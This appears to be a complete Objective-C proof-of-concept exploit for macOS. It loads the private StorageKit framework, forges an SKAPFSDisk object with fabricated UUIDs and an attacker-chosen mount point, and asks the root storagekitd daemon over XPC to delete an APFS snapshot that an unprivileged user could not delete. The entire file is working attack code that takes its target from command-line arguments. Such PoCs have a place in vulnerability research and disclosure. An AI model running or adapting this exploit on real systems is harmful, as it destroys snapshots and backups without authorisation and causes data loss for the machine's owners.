// Unentitled uid501 PoC: drive root storagekitd to delete an APFS snapshot it cannot delete itself.
// Uses StorageKit.framework SKHelperClient (which sets up the NSXPC connection to com.apple.storagekitd).
#import <Foundation/Foundation.h>
#import <dlfcn.h>

@interface SKDiskShim : NSObject
- (void)setMountPoint:(NSString *)mp;
- (NSString *)mountPoint;
- (id)initWithDictionary:(NSDictionary *)d;
@end

@interface SKHelperClientShim : NSObject
- (instancetype)init;
- (void)deleteSnapshots:(NSArray *)snaps disk:(id)disk completionBlock:(void(^)(NSError *err))block;
@end

int main(int argc, char **argv) {
    @autoreleasepool {
        if (argc < 3) { fprintf(stderr, "usage: %s <mountPoint> <snapshotName>\n", argv[0]); return 2; }
        NSString *mp   = [NSString stringWithUTF8String:argv[1]];
        NSString *snap = [NSString stringWithUTF8String:argv[2]];

        void *h = dlopen("/System/Library/PrivateFrameworks/StorageKit.framework/StorageKit", RTLD_NOW);
        printf("[*] dlopen StorageKit = %p\n", h);
        if (!h) { printf("dlerror: %s\n", dlerror()); return 1; }

        Class SKAPFSDisk     = NSClassFromString(@"SKAPFSDisk");
        Class SKDisk         = NSClassFromString(@"SKDisk");
        Class SKHelperClient = NSClassFromString(@"SKHelperClient");
        printf("[*] SKAPFSDisk=%p SKDisk=%p SKHelperClient=%p\n", SKAPFSDisk, SKDisk, SKHelperClient);

        Protocol *nsc = @protocol(NSSecureCoding);
        printf("[*] SKDisk conformsTo NSSecureCoding   = %d\n", [SKDisk conformsToProtocol:nsc]);
        printf("[*] SKAPFSDisk conformsTo NSSecureCoding = %d\n", [SKAPFSDisk conformsToProtocol:nsc]);
        printf("[*] SKAPFSDisk respondsTo +supportsSecureCoding = %d\n", [SKAPFSDisk respondsToSelector:@selector(supportsSecureCoding)]);

        // Forge an SKAPFSDisk with just a mountPoint (the daemon only reads mountPoint + isKindOfClass:SKAPFSDisk)
        id disk = [[SKAPFSDisk alloc] init];
        // Populate the fields the client-side encoder (dictionaryRepresentation) touches so it won't hit nil.
        NSDictionary *kv = @{
            @"mountPoint": mp,
            @"diskObjectID": @(1),
            @"diskIdentifier": @"disk3s7",
            @"volumeUUID": @"00000000-0000-0000-0000-000000000000",
            @"mediaUUID":  @"00000000-0000-0000-0000-000000000000",
            @"apfsUUID":   @"00000000-0000-0000-0000-000000000000",
            @"type": @"Apple_APFS",
            @"filesystemType": @"apfs",
            @"volumeName": @"skScratch",
            @"ioContent": @"41504653-0000-11AA-AA11-00306543ECAC",
            @"role": @"",
            @"protocol": @"",
            @"mediaName": @"skScratch",
        };
        for (NSString *k in kv) { @try { [disk setValue:kv[k] forKey:k]; } @catch(NSException *e){ printf("[~] set %s skipped: %s\n", [k UTF8String], [[e reason] UTF8String]); } }
        printf("[*] forged SKAPFSDisk mountPoint = %s\n", [[disk mountPoint] UTF8String]);

        SKHelperClientShim *client = [[SKHelperClient alloc] init];
        printf("[*] SKHelperClient instance = %p\n", client);

        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        __block NSError *outErr = nil; __block BOOL called = NO;
        printf("[*] calling deleteSnapshots:@[%s] disk:<forged> ...\n", argv[2]);
        @try {
            [client deleteSnapshots:@[snap] disk:disk completionBlock:^(NSError *err){
                called = YES; outErr = err;
                printf("[+] completionBlock: err=%s\n", err ? [[err description] UTF8String] : "nil (SUCCESS)");
                dispatch_semaphore_signal(sem);
            }];
        } @catch (NSException *ex) {
            printf("[!] exception: %s : %s\n", [[ex name] UTF8String], [[ex reason] UTF8String]);
        }

        long t = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 20LL*NSEC_PER_SEC));
        if (t != 0) printf("[!] timed out waiting for completion (called=%d)\n", called);
        printf("[*] done.\n");
    }
    return 0;
}
